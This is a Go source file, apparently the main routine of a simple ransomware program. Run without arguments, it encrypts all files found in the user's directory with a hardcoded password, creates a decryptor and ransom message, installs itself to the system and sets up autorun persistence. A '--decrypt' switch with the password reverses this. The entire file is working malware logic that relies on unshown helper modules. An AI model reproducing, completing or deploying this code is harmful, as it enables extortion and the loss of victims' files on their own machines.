package main

import (
	a "./src/persistence"
	e "./src/encryption"
	f "./src/files"
	i "./src/system"
	m "./src/messagebox"
)

func main() {
	// Password
	var password      = "password" 
	// Information
	var infoEncrypted = "Hello, you files has been encrypted!"
	// If password is correct
	var infoDecrypted = "Password is correct, starting decryption..."
	// If password incorrect
	var infoWrongPass = "Wrong encryption password!"


	// Check args
	args := i.Args()
	if len(args) > 1 {
		// If key '--decrypt'
		if args[1] == "--decrypt" {
			input_password := args[2]
			// If password is correct
			if input_password == password {
				// Show 'Correct password' message
				m.MessageBox(0x0, infoDecrypted, "goDecoder", 0x40)
				// Scan files
				var Encrypted = f.ScanEncrypted( i.GetUserDir() )
				// Decrypt files
				for _, file := range Encrypted {
					e.DecryptFile(file, password)
				}
				// Uninstall autorun
				a.Uninstall()
				// Delete decryptor
				e.DeleteDecryptor()
				// Exit
				i.Exit(0)
			} else {
				// Show 'Wrong password' message
				m.MessageBox(0x0, infoWrongPass, "goDecoder", 0x10)
				// Exit
				i.Exit(1)
			}
		}
		
	// Encrypt files
	} else {
		// Scan files
		var unEncrypted = f.ScanUnEncrypted( i.GetUserDir() )
		// Encrypt files
		for _, file := range unEncrypted {
			e.EncryptFile(file, password)
		}
		// Create decryptor file
		e.CreateDecryptor(infoEncrypted)
		// Install to system
		a.InstallToSystem()
		// Install autorun
		a.Install()
		// Show 'information' message
		m.MessageBox(0x0, infoEncrypted, "goEncoder", 0x30)
		// Exit
		i.Exit(0)
	}
}